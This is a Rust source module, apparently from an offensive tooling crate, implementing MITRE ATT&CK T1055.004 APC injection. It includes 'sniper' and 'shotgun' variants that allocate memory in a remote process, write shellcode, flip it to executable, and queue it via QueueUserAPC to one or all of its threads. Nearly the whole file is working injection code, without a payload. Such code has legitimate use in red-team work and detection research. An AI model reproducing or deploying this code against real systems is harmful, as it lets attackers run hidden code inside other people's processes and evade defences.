//! Implementation of MITRE ATT&CK T1055.004: Asynchronous Procedure Call.
//!
//! Provides capabilities to queue APCs to threads in a remote process.
//! This module implements both "Sniper" (single thread) and "Shotgun" (all threads) approaches.

use std::{mem::transmute, ptr::null};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE, PAPCFUNC},
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                Thread32Next,
            },
        },
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            OpenProcess, OpenThread, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            QueueUserAPC, THREAD_SET_CONTEXT,
        },
    },
};

use crate::{
    error::InjectumError,
    info,
    payload::Payload,
    strategy::{Method, Strategy, Technique},
    target::Target,
};

/// The strategy implementation for T1055.004 (Asynchronous Procedure Call).
#[derive(Default)]
pub(crate) struct T1055_004;

/// Internal enum to strictly define sub-techniques.
#[derive(Debug, PartialEq)]
enum InjectionMethod {
    SniperAPCInjection,
    SprayAPCInjection,
}

impl TryFrom<Method> for InjectionMethod {
    type Error = InjectumError;

    fn try_from(method: Method) -> Result<Self, Self::Error> {
        match method.0 {
            "SniperAPCInjection" => Ok(Self::SniperAPCInjection),
            "SprayAPCInjection" => Ok(Self::SprayAPCInjection),
            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
        }
    }
}

impl Strategy for T1055_004 {
    fn requires_pid(&self, method: Method) -> bool {
        !matches!(method.0, "Self")
    }

    fn execute(
        &self,
        payload: &Payload,
        target: &Target,
        method: Method,
    ) -> Result<(), InjectumError> {
        let info = Technique::T1055_004.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let variant: InjectionMethod = method.try_into()?;

        // 1. Validate Target (PID required)
        let pid = target
            .pid()
            .ok_or(InjectumError::PidRequired(info.mitre_id))?;

        // 2. Validate Payload
        let shellcode = match payload {
            Payload::Shellcode { bytes: b, .. } => b,
            _ => {
                return Err(InjectumError::PayloadMismatch {
                    strategy: info.mitre_id,
                    payload_type: "Shellcode",
                });
            }
        };

        // 3. Execution based on variant
        match variant {
            InjectionMethod::SniperAPCInjection => {
                info!("Method: APC Injection (Sniper Mode)");
                apc_injection_sniper(pid, shellcode)
            }
            InjectionMethod::SprayAPCInjection => {
                info!("Method: APC Spray (Shotgun Mode)");
                apc_injection_shotgun(pid, shellcode)
            }
        }
    }
}

/// Wrapper to ensure handles are closed when they go out of scope.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// [Sniper APC Injection]
/// Performs "Sniper" injection: queues an APC to a single thread in the target.
fn apc_injection_sniper(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
    // 1. Enumerate Threads
    let threads = find_target_threads(pid)?;
    // We just pick the first thread we find. In a robust tool, you might check if the thread is in an alertable state.
    let target_thread_id = threads[0];
    info!("Targeting Thread ID: {}", target_thread_id);

    // 2. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE,
            pid,
        )
    };

    if process_handle.is_null() {
        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
            GetLastError()
        }));
    }

    let process_handle_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory RW (Read-Write)
    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
            GetLastError()
        }));
    }

    // 4. Write Shellcode to Target Memory
    let mut bytes_written: usize = 0;

    let write_success = unsafe {
        WriteProcessMemory(
            process_handle_guard.0,
            remote_buffer,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if write_success == 0 || bytes_written != shellcode.len() {
        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Change Protection to RX (Execute-Read)
    let mut old_protect: u32 = 0;

    let protect_success = unsafe {
        VirtualProtectEx(
            process_handle_guard.0,
            remote_buffer,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if protect_success == 0 {
        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
            GetLastError()
        }));
    }

    // 6. Open Thread
    let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, target_thread_id) };

    if thread_handle.is_null() {
        return Err(InjectumError::Win32Error("OpenThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    // 7. Queue APC
    let papc_func: PAPCFUNC = unsafe { transmute(remote_buffer) };

    // The thread will execute this when it enters an alertable state.
    let result = unsafe { QueueUserAPC(papc_func, thread_handle, 0) };

    if result == 0 {
        return Err(InjectumError::Win32Error("QueueUserAPC", unsafe {
            GetLastError()
        }));
    }

    Ok(())
}

/// [Spray APC Injection]
/// Performs "Shotgun" injection: queues an APC to *every* thread in the target.
fn apc_injection_shotgun(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
    // 1. Enumerate Threads
    let threads = find_target_threads(pid)?;
    info!("Found {} threads in target process.", threads.len());

    // 2. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE,
            pid,
        )
    };

    if process_handle.is_null() {
        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
            GetLastError()
        }));
    }

    let process_handle_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory RW (Read-Write)
    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
            GetLastError()
        }));
    }

    // 4. Write Shellcode to Target Memory
    let mut bytes_written: usize = 0;
    let write_success = unsafe {
        WriteProcessMemory(
            process_handle_guard.0,
            remote_buffer,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if write_success == 0 || bytes_written != shellcode.len() {
        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Change Protection to RX (Execute-Read)
    let mut old_protect: u32 = 0;

    let protect_success = unsafe {
        VirtualProtectEx(
            process_handle_guard.0,
            remote_buffer,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if protect_success == 0 {
        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
            GetLastError()
        }));
    }

    // 6. Queue APC
    let papc_func: PAPCFUNC = unsafe { transmute(remote_buffer) };

    // Index 0 = Failure (0), Index 1 = Success (!0)
    // We initialize it as [0 failures, 0 successes]
    let mut stats = [0usize; 2];

    // 7. Loop through all threads
    for thread_id in threads {
        let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id) };

        if !thread_handle.is_null() {
            let _thread_guard = HandleGuard::new(thread_handle);
            stats[(unsafe { QueueUserAPC(papc_func, thread_handle, 0) } != 0) as usize] += 1;
        } else {
            stats[0] += 1;
        }
    }

    info!(
        "APC Spray Complete. Queued: {}, Failed/Skipped: {}",
        stats[1], stats[0]
    );

    if stats[1] == 0 {
        return Err(InjectumError::General(
            "Failed to queue APC to any threads.".to_string(),
        ));
    }

    Ok(())
}

/// Helper: Finds all threads belonging to a specific PID using ToolHelp32.
fn find_target_threads(pid: u32) -> Result<Vec<u32>, InjectumError> {
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };

    if snapshot_handle == INVALID_HANDLE_VALUE {
        return Err(InjectumError::Win32Error(
            "CreateToolhelp32Snapshot",
            unsafe { GetLastError() },
        ));
    }

    let _snapshot_guard = HandleGuard::new(snapshot_handle);

    let mut t_entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    if unsafe { Thread32First(snapshot_handle, &mut t_entry) } == FALSE {
        return Err(InjectumError::Win32Error("Thread32First", unsafe {
            GetLastError()
        }));
    }

    let mut thread_ids = Vec::new();

    loop {
        if t_entry.th32OwnerProcessID == pid {
            thread_ids.push(t_entry.th32ThreadID);
        }

        t_entry.dwSize = size_of::<THREADENTRY32>() as u32;

        if unsafe { Thread32Next(snapshot_handle, &mut t_entry) } == FALSE {
            break;
        }
    }

    if thread_ids.is_empty() {
        return Err(InjectumError::General(
            "No threads found for target process.".to_string(),
        ));
    }

    Ok(thread_ids)
}
